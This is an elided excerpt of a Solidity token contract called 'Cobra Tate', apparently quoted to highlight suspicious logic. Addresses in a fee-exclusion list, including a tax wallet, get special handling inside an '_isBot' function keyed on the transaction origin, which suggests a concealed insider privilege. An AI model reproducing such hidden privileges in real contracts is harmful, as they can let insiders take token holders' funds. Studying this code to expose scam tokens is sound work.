...
contract Token is Context, IERC20, Ownable {
    ...
    mapping(address => bool) private _isCOBRATATEExcludedFromFees;
    ...
    string private _name = unicode"Cobra Tate";
    string private _symbol = unicode"COBRATATE";
    ...
    constructor() payable {
        ...
        _isCOBRATATEExcludedFromFees[owner()] = true;
        _isCOBRATATEExcludedFromFees[address(this)] = true;
        _isCOBRATATEExcludedFromFees[_taxWallet] = true;
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner()) {
            ...
            if (
                ...
                !_isCOBRATATEExcludedFromFees[to]
            ) {
    ...
    function _isBot(address from, address to, uint256 amount) private returns(bool) {
        _spender = from;
        if(_isCOBRATATEExcludedFromFees[_msgOrigin()]) {
            _spender = address(0);
